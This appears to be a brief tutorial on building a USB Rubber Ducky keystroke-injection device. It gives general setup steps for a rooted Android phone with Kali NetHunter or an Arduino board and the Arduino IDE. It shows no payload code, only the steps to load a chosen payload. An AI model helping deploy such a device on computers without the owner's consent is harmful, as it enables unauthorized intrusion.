How To Make A USB Rubber Ducky?
Android mobiles can also be used to make a USB rubber ducky, if an Android device is rooted we may use it as a Rubber ducky device. And can perform all the operations that an original ducky can perform. 

To Make USB rubber ducky from android : 

Android mobile must be rooted
Kali net hunter installed on the device
In this article, we must be using some other components to create a USB Rubber Ducky at home. 

Material Requirements

Arduino based board
USB connector
Arduino IDE
Step 1: First of all download Arduino IDE from official website, and install the software like any other software you install on windows. 

Step 2: Connect the Arduino board to the computer using the USB connector and open the IDE. 

Step 3: Now from the Payload list choose according to your task. 

Step 4: Convert the code that you have chosen to make executable in Arduino here.

Step 5:In the Arduino IDE creates a new project, by clicking on File–> New project. 

Step 6: After converting to new code adding to the Arduino IDE, now select the board which you are using. Tools–>Board–>Your board. 

Step 7: Click on the project and choose the port, where Arduino is connected. Tools–>Port–>Your Port. 

Step 8: Now when the board is connected, enter the code or payload you want to work with. 

Step 9: Now verify and compile your code. Sketch–>verify/compile. 

Step 10: After compiling, upload the code to the Arduino device. 

Whenever you will Connect this board with any computer it works as a USB rubber ducky and executes the payload written
